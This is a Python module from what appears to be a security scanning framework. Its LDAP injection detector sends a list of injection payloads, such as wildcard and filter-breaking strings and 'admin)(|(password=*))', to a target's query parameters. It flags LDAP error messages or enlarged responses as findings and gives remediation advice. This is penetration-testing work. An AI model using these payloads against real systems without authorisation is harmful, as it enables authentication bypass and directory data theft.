"""LDAP 注入检测器"""
import urllib.parse
from typing import List
from secops_core.http_client import http_get, http_post
from secops_core.config import ATTACK_DELAY
from secops_offense.attack_engine.finding import Finding
from secops_offense.attack_engine.auth import log_audit
from secops_offense.attack_engine.modules.base import BaseDetector
import time


class LDAPDetector(BaseDetector):
    name = "ldap"
    category = "LDAP"

    PAYLOADS = [
        "*",
        "*)",
        "*()",
        "*)(&",
        "admin*)(&",
        "*)(&(",
        "*)(&)",
        "(|(uid=*))",
        "(|(cn=*))",
        "(&(uid=*))",
        "(&(cn=*))",
        "(&(objectClass=*))",
        "*)(objectClass=*",
        "admin)(objectClass=*",
        "*))(|(uid=",
        "*)%00",
        "admin)(|(password=*))",
    ]

    ERROR_SIGNS = [
        "ldap_search", "ldap_bind", "LDAP error",
        "Protocol error", "Operations error",
        "Unwilling to perform", "Invalid DN syntax",
        "Operations Error", "unterminated",
    ]

    def test(self, target_url: str, params: list = None, **kwargs) -> List[Finding]:
        findings = []

        if params is None:
            parsed = urllib.parse.urlparse(target_url)
            if parsed.query:
                params = list(urllib.parse.parse_qs(parsed.query).keys())
            else:
                params = ["uid", "user", "username", "login", "email",
                          "cn", "name", "search", "filter", "query"]

        parsed = urllib.parse.urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for param in params:
            for payload in self.PAYLOADS:
                test_url = f"{base_url}?{urllib.parse.urlencode({param: payload})}"
                log_audit("LDAP_TEST", test_url, f"param={param}, payload={payload[:50]}")

                status, headers, body = http_get(test_url)

                if status == 0:
                    time.sleep(ATTACK_DELAY)
                    continue

                body_lower = body.lower()
                if any(sig.lower() in body_lower for sig in self.ERROR_SIGNS):
                    findings.append(Finding(
                        vuln_type="LDAP", severity="critical",
                        title=f"LDAP 注入 - 参数 {param}",
                        location=test_url, payload=payload,
                        evidence=f"LDAP 错误信息泄露: {[s for s in self.ERROR_SIGNS if s.lower() in body_lower][:2]}",
                        description=f"参数 {param} 直接拼接到 LDAP 查询中，可通过注入修改查询逻辑。",
                        remediation="使用参数化 LDAP 查询，对用户输入进行转义"
                    ))
                    break

                if status == 200 and len(body) > 0:
                    baseline_url = f"{base_url}?{urllib.parse.urlencode({param: 'test123456789'})}"
                    _, _, baseline_body = http_get(baseline_url)
                    if len(body) > len(baseline_body) * 1.5 and len(body) > 500:
                        findings.append(Finding(
                            vuln_type="LDAP", severity="high",
                            title=f"疑似 LDAP 注入 (数据泄露) - 参数 {param}",
                            location=test_url, payload=payload,
                            evidence=f"响应长度差异: {len(baseline_body)} vs {len(body)}",
                            description=f"参数 {param} 可能允许 LDAP 通配符查询，泄露敏感数据。",
                            remediation="限制 LDAP 查询范围，实施最小权限原则"
                        ))
                        break

                time.sleep(ATTACK_DELAY)

        return findings
